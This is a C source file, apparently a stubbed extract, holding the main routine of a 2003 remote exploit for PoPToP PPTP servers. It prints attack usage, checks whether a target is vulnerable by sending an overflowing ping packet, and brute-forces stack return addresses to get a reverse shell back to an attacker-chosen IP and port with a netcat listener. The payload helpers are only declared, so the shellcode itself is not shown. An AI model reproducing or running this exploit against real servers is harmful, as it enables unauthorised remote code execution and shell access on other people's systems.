#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  ctrl_type; int /*<<< orphan*/  length; } ;
struct pptp_reply {TYPE_1__ header; } ;
typedef  int DWORD ;

/* Variables and functions */
 int BOTTOMOFSTACK ; 
 scalar_t__ STEP ; 
 int TOPOFSTACK ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  close (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  connect_server (char*) ; 
 int htons (int /*<<< orphan*/ ) ; 
 int ntohs (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int recv (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  send_init_request (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  send_ping_overflow (int /*<<< orphan*/ ,int,char*,int) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  st ; 

int main(int argc, char** argv)
{
        printf("\n");
        printf("                   D  H     H                            \n");
        printf("                   D  H     H     T\n");
        printf("                   D  H  H  H     T     EE    AA   M   M \n");
        printf("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        printf("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        printf("             D     D  H     H     T    EEE   AAAA  M M M \n");
        printf("              D    D  H     H     T    E     A  A  M   M \n");
        printf("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        printf(" ... presents ... \n\n");
  	printf("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        printf("by .einstein., April 2003.\n");
        printf("\n");
  if (argc < 2)
  {
        printf("usage: \n");
        printf("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",argv[0]);
        printf("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
        printf("      you want to attack.  Port 1723 is used for connection\n");
        printf("    <your_ip> and <your_port> - specify an ip address to which\n");
        printf("      a connection is possible to port <your_port> and set up a\n");
        printf("      netcat listener. You'll get a reverse shell.\n");
        printf("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
        printf("   If you only pass a single parameter, the program will check\n");
        printf("   whether remote server is vulnerable or not. Otherwise it will\n");
        printf("   perform a ret bruteforce.\n");
        printf("usage examples:\n");
        printf("  %s 192.168.1.2 192.168.1.1 5555\n",argv[0]);
        printf("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
        printf("  %s 127.0.0.1 127.0.0.1 6666 100\n",argv[0]);
        printf("    attack a locally running pptpd with a timeout of 100 ms\n");
        printf("    and get a shell on port 6666.\n");
        printf("  %s 192.168.1.56\n",argv[0]);
        printf("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
	return 0;
  }


  int timeout = 500;
  if (argc >= 5) timeout = atoi(argv[4]);

        DWORD ret;
        if (argc == 2)
        {
                if (!connect_server(argv[1])) return 1;

                printf("\nChecking if the server is vulnerable..\n");
                printf("(if it is you have to wait 65 seconds)..\n");
                send_init_request(st);

                ret = 0x01010101;
                int bytes;
                struct pptp_reply reply;
                        
                //header length
                bytes = recv(st,(char*)&reply,2,0);
                bytes = ntohs(reply.header.length);
                bytes = recv(st,(char*)&reply+2,bytes-2,0);
                int j = htons(reply.header.ctrl_type);
                send_ping_overflow(st,ret,"0.0.0.0",0);
                        
                //header length
                bytes = recv(st,(char*)&reply,2,0);
                printf("PoPToP server is ");
                if (bytes != -1) printf("vulnerable!\n");
                else printf("not vulnerable\n");
                close(st);

                return 1;
        }

        printf("[!] Attempting bruteforce against %s\n",argv[1]);
        printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));
        
        int checked = 0;
        
        for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP)
        {
          	printf("[*] ");
                if (!connect_server(argv[1])) return 1;
        	printf("[ret=0x%x]..",ret);
        	printf("sending payload..");
        
                // initial packet
                send_init_request(st);

                //a real overflowing ping packet
          	send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
                close(st);

                sleep(timeout);
                printf("done\n");
        }
        
        return 0;
}